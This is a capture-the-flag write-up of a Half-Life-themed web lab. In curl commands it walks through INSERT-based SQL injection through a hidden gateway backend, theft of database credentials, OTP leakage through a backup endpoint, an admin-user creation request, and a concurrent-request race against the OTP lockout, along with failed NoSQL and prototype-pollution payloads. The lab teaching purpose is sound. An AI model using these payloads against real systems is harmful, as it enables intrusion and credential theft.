---
title: MesaNet - Weekly
tags:
  - bugforge
  - sqli
  - broken-access-control
  - race-condition
  - caido-mcp
---

- This has been the hardest challenge I have yet attempted. It was incredible learning experience and also a huge addition to my Caido MCP skill!

- **Difficulty:** Hard
- **Theme:** Half-Life / Black Mesa Research Facility
- **Skills:** Caido MCP utilised with new improvements to the original code. Correct prompting and really making it narrow down to specifics is crucial
---

## TL;DR

- SQL injection in a hidden gateway service → database credential extraction → database admin portal access → backup feature exposes live OTP → dev console bypass → flag.

**Attack Chain:**
```
SQLi (Rail /api/rail/create) → DB creds → /db portal login → portalDb backup → OTP extraction → /dev/verify bypass → flag
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Gateway Architecture](#2-gateway-architecture)
3. [SQL Injection — Rail Backend](#3-sql-injection--rail-backend)
4. [Database Credential Extraction](#4-database-credential-extraction)
5. [Database Admin Portal](#5-database-admin-portal)
6. [Backup Feature & DB Name Fuzzing](#6-backup-feature--db-name-fuzzing)
7. [OTP Extraction & Dev Console Access](#7-otp-extraction--dev-console-access)
8. [Flag](#8-flag)
9. [Bonus: What Else Was in the Database](#9-bonus-what-else-was-in-the-database)
10. [Dead Ends — What Didn't Work](#10-dead-ends--what-didnt-work)
11. [Race Condition (Bonus Finding)](#11-race-condition-bonus-finding)
12. [Key Takeaways](#12-key-takeaways)

---

## 1. Reconnaissance

### Initial Login

The app presents a login page. Standard `application/x-www-form-urlencoded` login **fails** — the backend only accepts JSON.

```bash
# This FAILS with "Invalid credentials"
curl -s -X POST https://<LAB>/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=operator&password=operator"

# This WORKS — JSON only
curl -s -X POST https://<LAB>/login \
  -H "Content-Type: application/json" \
  -d '{"username":"operator","password":"operator"}'
```

Response: `302 Found` with a `connect.sid` session cookie.

> **Lesson:** Always try JSON when form-urlencoded fails. This pattern repeats throughout the entire lab.

### Dashboard Exploration

After login, the dashboard reveals a Half-Life themed intranet with three applications:
- **Nexus** — a notes/document system
- **Secure Mail** — internal messaging
- **Dev Console** — OTP-protected at `/dev`

```bash
# Get session cookie
COOKIE="connect.sid=s%3A<YOUR_SESSION_ID>"

# Check the dashboard
curl -s -b "$COOKIE" https://<LAB>/
```

### Dev Console — OTP Wall

```bash
curl -s -b "$COOKIE" https://<LAB>/dev
```

The dev console requires a 6-character OTP that rotates every 60 seconds, with 10 attempts per rotation before lockout.

```bash
# Check remaining time
curl -s -b "$COOKIE" https://<LAB>/dev/time-remaining
# Returns: {"remaining":45}
```

The OTP hint says: *"Contact your system administrator for the current password."*

---

## 2. Gateway Architecture

All internal app communication goes through a unified gateway:

```bash
# Gateway request format
curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
  -H "Content-Type: application/json" \
  -d '{
    "id": "<APP_UUID>",
    "endpoint": "/api/<path>",
    "data": {}
  }'
```

### Discovered App IDs

Through the client-side JavaScript files:

```bash
# Nexus client
curl -s https://<LAB>/public/js/nexus-client.js
# Mail client
curl -s https://<LAB>/public/js/mail-client.js
```

| App | UUID |
|-----|------|
| Nexus (notes) | `a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e` |
| Mail | `b3e8d1f6-4c9a-4b2e-8f7d-6a1c9b3e5f8d` |
| Rail (hidden) | `00000000-0000-0000-0000-000000000000` |

### Three Distinct Gateway Errors

This is critical for understanding the architecture (took me a lot of reading):

```bash
# Random UUID → "Unknown application ID"
# Valid Nexus UUID + invalid endpoint → "Endpoint not found"
# Zero UUID + any endpoint → "Rail endpoint not found"
```

- The zero-UUID routes to a **hidden third backend** called "Rail" with its own error message format — confirming it's a separate service.

### Enumerating Users

```bash
# List notes to see authors
curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
  -H "Content-Type: application/json" \
  -d '{
    "id": "a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e",
    "endpoint": "/api/notes/list",
    "data": {}
  }'
```

- 10 users discovered: `operator` (us, clearance 3), `gfreeman`, `bcalhoun`, `ikleiner`, `evance`, `avance`, `wbreen`, `colette`, `gcross`, `otis`

- 3 confidential notes (IDs 4, 11, 13) return: *"Insufficient permissions to read"*

---

## 3. SQL Injection — Rail Backend

- After extensive endpoint fuzzing on the Rail backend, the `/api/rail/create` endpoint was discovered:

```bash
# Rail create endpoint accepts messages
curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
  -H "Content-Type: application/json" \
  -d '{
    "id": "00000000-0000-0000-0000-000000000000",
    "endpoint": "/api/rail/create",
    "data": {
      "message": "test"
    }
  }'
```

### Testing for SQLi

- The `message` field is vulnerable to INSERT-based SQL injection:

```bash
# SQLi test — single quote breaks the query
curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
  -H "Content-Type: application/json" \
  -d '{
    "id": "00000000-0000-0000-0000-000000000000",
    "endpoint": "/api/rail/create",
    "data": {
      "message": "test'"'"'"
    }
  }'
# Returns SQL error
```

### Extracting Data via INSERT Injection

- Since this is an INSERT statement, we use subquery injection to exfiltrate data:

```bash
# Enumerate tables
curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
  -H "Content-Type: application/json" \
  -d '{
    "id": "00000000-0000-0000-0000-000000000000",
    "endpoint": "/api/rail/create",
    "data": {
      "message": "x'"'"' || (SELECT group_concat(name) FROM sqlite_master WHERE type='"'"'table'"'"') || '"'"'x"
    }
  }'
```

- This reveals the table structure. 
- From there, we can extract column names and data.

---

## 4. Database Credential Extraction

- The Rail database contains a `config` table with database administration credentials:

```bash
# Extract config table contents
curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
  -H "Content-Type: application/json" \
  -d '{
    "id": "00000000-0000-0000-0000-000000000000",
    "endpoint": "/api/rail/create",
    "data": {
      "message": "x'"'"' || (SELECT group_concat(key || '"'"':'"'"' || value) FROM config) || '"'"'x"
    }
  }'
```

**Extracted credentials:**
```
Username: dbadmin
Password: Xen_Lambda_R4ilSyst3m_2024!Cr0ss1ng
```

---

## 5. Database Admin Portal

- With DB creds in hand, the next question: where do we use them?

```bash
# Fuzz for admin portals
curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE" https://<LAB>/db
# Returns: 200
```

The `/db` endpoint reveals a **Database Administration** login page with `POST /db/login`.

### Login — JSON Required (Again)

```bash
# Form-urlencoded FAILS (same pattern as main login)
curl -s -b "$COOKIE" -X POST https://<LAB>/db/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=dbadmin&password=Xen_Lambda_R4ilSyst3m_2024%21Cr0ss1ng"
# Returns: "Invalid credentials"

# JSON WORKS
curl -s -b "$COOKIE" -X POST https://<LAB>/db/login \
  -H "Content-Type: application/json" \
  -d '{"username":"dbadmin","password":"Xen_Lambda_R4ilSyst3m_2024!Cr0ss1ng"}'
# Returns: 302 → /db (success!)
```

### The DB Admin Console

After authentication, the console shows:
- **2 connected databases** (SQLite 3 engine)
- **Backup & Export** feature — `POST /db/backup` with `{"database": "<name>"}`
- Query Editor, Schema Viewer, etc. — all "COMING SOON"
- Placeholder hint in the input field: `*Db`

---

## 6. Backup Feature & DB Name Fuzzing

- The backup endpoint requires a valid database name matching the pattern `<name>Db`:

```bash
# Invalid name returns this error
curl -s -b "$COOKIE" -X POST https://<LAB>/db/backup \
  -H "Content-Type: application/json" \
  -d '{"database":"invalidDb"}'
# {"error":"Invalid database name. Must be <name>Db"}
```

### Fuzzing Database Names

```bash
# Batch fuzz
for name in nexusDb mailDb railDb usersDb mesaDb devDb appDb authDb \
            portalDb mainDb systemDb gatewayDb secretDb flagDb; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$COOKIE" \
    -H "Content-Type: application/json" \
    -d "{\"database\":\"$name\"}" \
    "https://<LAB>/db/backup")
  echo "$name: $code"
done
```

**Results:**
```
nexusDb: 400     mailDb: 400      railDb: 200  ✓
usersDb: 400     mesaDb: 400      devDb: 400
appDb: 400       authDb: 400      portalDb: 200  ✓
mainDb: 400      systemDb: 400    gatewayDb: 400
secretDb: 400    flagDb: 400
```

- Two valid databases: **`railDb`** and **`portalDb`**

### Downloading the Backups

```bash
# Download railDb
curl -s -b "$COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"database":"railDb"}' \
  -o railDb_backup.sqlite \
  "https://<LAB>/db/backup"

# Download portalDb
curl -s -b "$COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"database":"portalDb"}' \
  -o portalDb_backup.sqlite \
  "https://<LAB>/db/backup"
```

### Inspecting the Databases

```bash
# railDb — transit announcements and config (the creds we already had)
sqlite3 railDb_backup.sqlite ".tables"
# announcements  config

sqlite3 railDb_backup.sqlite "SELECT * FROM config;"
# db_username|dbadmin|Database administration username|...
# db_password|Xen_Lambda_R4ilSyst3m_2024!Cr0ss1ng|Database administration password|...

# portalDb — users and config (THE JACKPOT)
sqlite3 portalDb_backup.sqlite ".tables"
# config  users

sqlite3 portalDb_backup.sqlite "SELECT * FROM config;"
# dev_otp|835146|1770635908
```

- The `config` table contains **`dev_otp`** — the live OTP for the dev console.

---

## 7. OTP Extraction & Dev Console Access

- The OTP rotates every 60 seconds. The backup gives a point-in-time snapshot, so we need to grab it fresh and submit immediately:

```bash
# One-liner: download fresh backup → extract OTP → submit
OTP=$(curl -s -b "$COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"database":"portalDb"}' \
  -o /tmp/portal_fresh.sqlite \
  "https://<LAB>/db/backup" && \
  sqlite3 /tmp/portal_fresh.sqlite "SELECT value FROM config WHERE key='dev_otp';")

echo "OTP: $OTP"

# Submit OTP
curl -s -D - -b "$COOKIE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "otp=$OTP" \
  "https://<LAB>/dev/verify"
```

**Response:** `302 Found → Location: /dev` — we're in!

> **Note:** The OTP endpoint accepts form-urlencoded (it's an HTML form POST). This is one of the few endpoints where form-urlencoded actually works.

---

## 8. Flag

```bash
curl -s -b "$COOKIE" https://<LAB>/dev | grep -o 'bug{[^}]*}'
```

---

## 9. Bonus: What Else Was in the Database

### Full User Table with Entitlements

- The `portalDb` dump gives us all 10 users with bcrypt hashes and JSON entitlements:

| User | Clearance | Can Read Confidential |
|------|-----------|----------------------|
| operator (us) | 3 | No |
| gfreeman | 3 | No |
| bcalhoun | 2 | No |
| ikleiner | 4 | **Yes** |
| evance | 4 | **Yes** |
| avance | 2 | No |
| wbreen | 5 | **Yes** (+ write) |
| colette | 2 | No |
| gcross | 2 | No |
| otis | 1 | No (no Nexus access) |

### Dev Console — User Provisioning

- The dev console also reveals a **user provisioning endpoint** that could have been an alternative path:

```bash
# Create a user with max clearance and full entitlements
curl -s -b "$COOKIE" -X POST https://<LAB>/api/dev/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "superadmin",
    "password": "password123",
    "fullName": "Super Admin",
    "clearanceLevel": 5,
    "entitlements": {
      "nexus": {
        "access": true,
        "read": ["public", "restricted", "confidential"],
        "write": ["public", "restricted", "confidential"]
      },
      "mail": {
        "access": true,
        "canSend": true,
        "maxClassification": "confidential"
      }
    }
  }'
```

- This would have allowed reading the 3 confidential notes (IDs 4, 11, 13) that were locked behind clearance restrictions.

### Real App UUIDs (from Dev Console docs)

- The dev console also reveals the canonical App IDs (different from what the client JS uses):

| App | Dev Console UUID | Client JS UUID |
|-----|-----------------|----------------|
| Nexus | `11111111-1111-1111-1111-111111111111` | `a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e` |
| Mail | `22222222-2222-2222-2222-222222222222` | `b3e8d1f6-4c9a-4b2e-8f7d-6a1c9b3e5f8d` |

---

## 10. Dead Ends — What Didn't Work

- This lab was brutal. 
- Here's everything that was tried and failed, to save you time:

### OTP Bypass Attempts
| Attempt | Result |
|---------|--------|
| `"000000"` | Invalid OTP. 9 attempts remaining |
| `true` (type confusion) | Invalid OTP. 8 attempts remaining |
| `{"$ne":""}` (NoSQL injection) | Invalid OTP. 7 attempts remaining |
| `{"$regex":".*"}` | Invalid OTP. 6 attempts remaining |

**Conclusion:** OTP uses direct string comparison, not a database query.

### Classification / Privilege Escalation
- Mass assignment (`clearance:5`, `userId:5`) at gateway level — ignored
- Prototype pollution (`__proto__:{clearance:5}`) — ignored
- `classification:"public"` in note GET data — ignored
- Creating confidential notes/mail — "Insufficient permissions" (403)

### Gateway Manipulation
- Path traversal (`/api/../dev/time-remaining`) — "Endpoint not found"
- Non-API endpoints — "Only /api/ endpoints are allowed"
- Cross-app endpoint routing — "Endpoint not found"
- Extra JSON fields (method, userId, user) — all ignored

### SQL Injection Limitations
- Stacked queries — not supported
- `ATTACH DATABASE` — blocked
- `readfile()` / `writefile()` — not available
- SQLi on OTP field — not injectable

### Other
- Login as other users with common passwords — all failed
- NoSQL injection on main login (form-urlencoded `password[$ne]=`) — **crashes the backend** (502). Don't do this.

---

## 11. Race Condition (Bonus Finding)

- The OTP endpoint has a race condition in its attempt counter. 
- By sending concurrent requests, you can bypass the 10-attempt lockout:

```bash
# Send 1000 concurrent OTP attempts
seq 1 1000 | xargs -P 50 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
  -b "$COOKIE" \
  -d "otp=000000" \
  "https://<LAB>/dev/verify"
```

**Result:** 928 out of 1000 requests got processed (not blocked), proving the counter isn't atomic. However, with a 6-character OTP and 60-second rotation window, brute force still isn't practical - there are too many possible combinations even with unlimited attempts.

- The race condition is a real vulnerability, but the backup → OTP extraction path is the intended solve.

---

## 12. Key Takeaways

1. **JSON vs form-urlencoded:** When a login returns "Invalid credentials" with form data, always try JSON. This lab uses JSON-only auth on multiple endpoints (`/login`, `/db/login`).

2. **Hidden services behind gateways:** Different error messages reveal different backends. "Endpoint not found" vs "Rail endpoint not found" told us there were at least 3 distinct services.

3. **INSERT-based SQLi for data exfil:** When you find injection in an INSERT statement, use subquery concatenation to pull data: `'|| (SELECT ...) ||'`

4. **Credential reuse across interfaces:** DB creds extracted from one layer (SQLi) authenticated to a completely different interface (web portal).

5. **Backup features are goldmines:** The backup endpoint returned raw SQLite files. Always look for backup/export functionality — it often bypasses access controls by dumping the entire database.

6. **Name fuzzing matters:** The DB names weren't guessable from the app structure alone. `nexusDb` and `mailDb` both failed — only `railDb` and `portalDb` worked.

7. **Time-sensitive exploitation:** The OTP rotates every 60 seconds. Chaining backup download → SQLite parse → OTP submit had to happen within one rotation window.

### Vulnerability Classes

| # | Vulnerability | Impact |
|---|--------------|--------|
| 1 | SQL Injection (INSERT) | Full database read access |
| 2 | Credential exposure in DB | Lateral movement to admin portal |
| 3 | Insecure backup feature | Full database dump including secrets |
| 4 | OTP stored in accessible database | Authentication bypass |
| 5 | Race condition on attempt counter | Lockout bypass (bonus) |
| 6 | JSON-only auth (no CSRF protection) | Login endpoints lack form token validation |

---

## Full Attack Chain Diagram

```
                    ┌──────────────┐
                    │  operator:   │
                    │  operator    │
                    │  (JSON only) │
                    └──────┬───────┘
                           │
                    ┌──────▼───────┐
                    │   Gateway    │
                    │  POST /gate  │
                    │    way       │
                    └──────┬───────┘
                           │
              ┌────────────┼────────────┐
              │            │            │
        ┌─────▼────┐ ┌────▼─────┐ ┌────▼─────┐
        │  Nexus   │ │   Mail   │ │   Rail   │
        │ (notes)  │ │(messages)│ │ (hidden) │
        └──────────┘ └──────────┘ └────┬─────┘
                                       │
                                ┌──────▼───────┐
                                │    SQLi      │
                                │ INSERT into  │
                                │ /api/rail/   │
                                │    create    │
                                └──────┬───────┘
                                       │
                                ┌──────▼───────┐
                                │  DB Creds    │
                                │  dbadmin:    │
                                │  Xen_Lamb... │
                                └──────┬───────┘
                                       │
                                ┌──────▼───────┐
                                │   /db login  │
                                │  (JSON only) │
                                └──────┬───────┘
                                       │
                          ┌────────────┼────────────┐
                          │                         │
                   ┌──────▼───────┐          ┌──────▼───────┐
                   │   railDb     │          │  portalDb    │
                   │  (backup)    │          │  (backup)    │
                   │  transit     │          │  users +     │
                   │  data only   │          │  dev_otp!    │
                   └──────────────┘          └──────┬───────┘
                                                    │
                                             ┌──────▼───────┐
                                             │ OTP: 835146  │
                                             │ POST /dev/   │
                                             │   verify     │
                                             └──────┬───────┘
                                                    │
                                             ┌──────▼───────┐
                                             │    FLAG      │
                                             │ bug{9mjq...} │
                                             └──────────────┘
```
